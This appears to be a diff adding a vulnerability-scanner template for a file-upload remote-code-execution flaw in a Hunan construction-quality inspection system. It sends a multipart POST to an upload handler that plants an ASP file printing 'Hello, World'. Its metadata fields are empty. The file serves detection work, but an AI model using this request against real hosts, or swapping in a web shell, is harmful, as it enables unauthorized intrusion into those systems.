@@ -1,0 +1,30 @@
+id:
+
+info:
+  name: 湖南建研信息工程质量检测系统 文件上传致RCE漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /Applications/Attachment/upload.ashx
+  headers:
+    Content-Type: multipart/form-data; boundary=------------------------8ecd2b831e8d20f4
+    Connection: close
+  data: |
+    --------------------------8ecd2b831e8d20f4
+    Content-Disposition: form-data; name="file"; filename="asd.txt"
+      
+    <% Response.Write("Hello, World") %>
+    --------------------------8ecd2b831e8d20f4
+    Content-Disposition: form-data; name="_upload_guid"
+  
+    asd
+    --------------------------8ecd2b831e8d20f4--
+response1:
+  headers:
+  body: asd
+  code: 200
+requests2:
+response2:
